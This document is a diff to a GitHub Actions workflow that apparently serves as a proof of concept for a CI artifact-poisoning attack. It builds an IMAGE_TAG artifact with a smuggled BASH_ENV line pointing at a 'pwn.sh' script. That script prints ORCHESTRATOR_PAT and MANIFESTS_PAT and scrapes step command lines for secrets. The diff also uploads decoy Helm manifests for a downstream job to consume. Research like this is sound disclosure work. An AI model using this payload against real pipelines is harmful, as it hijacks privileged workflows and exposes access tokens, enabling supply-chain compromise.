@@ -1,12 +1,85 @@
 name: CI
 
 on:
-  push:
-    branches:
-      - main
+  pull_request:
+    branches: [main]
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "base CI push run"
+      - name: craft malicious artifacts
+        run: |
+          set -e
+          mkdir -p payload/manifests/helm/templates
+          {
+            echo "9.9.9"
+            echo "BASH_ENV=$GITHUB_WORKSPACE/pwn.sh"
+          } > payload/IMAGE_TAG
+          cat > payload/pwn.sh <<'EOS'
+          echo "=== PWNED_BASH_ENV_EXECUTED ==="
+          echo "whoami=$(id -un) uid=$(id -u)"
+          echo "cwd=$(pwd)"
+          echo "ORCHESTRATOR_PAT=$ORCHESTRATOR_PAT"
+          echo "MANIFESTS_PAT=$MANIFESTS_PAT"
+          echo "=== argv of the step shell (leaks inline secret args) ==="
+          tr '\0' ' ' < /proc/self/cmdline; echo
+          for a in $(tr '\0' '\n' < /proc/self/cmdline); do
+            case "$a" in /home/runner/work/_temp/*) echo "--- step script $a ---"; grep -o 'DUMMYSECRET[^ ]*' "$a" || true;; esac
+          done
+          exit 0
+          EOS
+          chmod +x payload/pwn.sh
+          cat > payload/manifests/helm/Chart.yaml <<'EOS'
+          apiVersion: v2
+          name: pwn
+          version: 0.1.0
+          EOS
+          cat > payload/manifests/helm/values.yaml <<'EOS'
+          image: ghcr.io/azure/gitops-connector:9.9.9
+          EOS
+          cat > payload/manifests/helm/templates/cm.yaml <<'EOS'
+          apiVersion: v1
+          kind: ConfigMap
+          metadata:
+            name: pwn
+          data:
+            a: b
+          EOS
+          find payload -type f
+      - name: upload image tags
+        uses: actions/upload-artifact@v4
+        with:
+          name: image_tags
+          path: payload/IMAGE_TAG
+      - name: upload manifests
+        uses: actions/upload-artifact@v4
+        with:
+          name: manifests
+          path: payload/manifests
+  layout:
+    runs-on: ubuntu-latest
+    needs: build
+    steps:
+      - name: download image tags layout
+        id: it
+        uses: dawidd6/action-download-artifact@268677152d06ba59fcec7a7f0b5d961b6ccd7e1e
+        with:
+          name: image_tags
+          run_id: ${{ github.run_id }}
+          path: ${{ github.workspace }}/probe_it
+          if_no_artifact_found: ignore
+      - name: download manifests layout
+        id: mf
+        uses: dawidd6/action-download-artifact@268677152d06ba59fcec7a7f0b5d961b6ccd7e1e
+        with:
+          name: manifests
+          run_id: ${{ github.run_id }}
+          path: ${{ github.workspace }}/probe_mf
+          if_no_artifact_found: ignore
+      - name: list layout
+        run: |
+          echo "PWD=$PWD"
+          find probe_it probe_mf -type f 2>/dev/null | sort
+          echo "--- IMAGE_TAG ---"
+          cat probe_it/IMAGE_TAG 2>/dev/null || echo "(missing)"
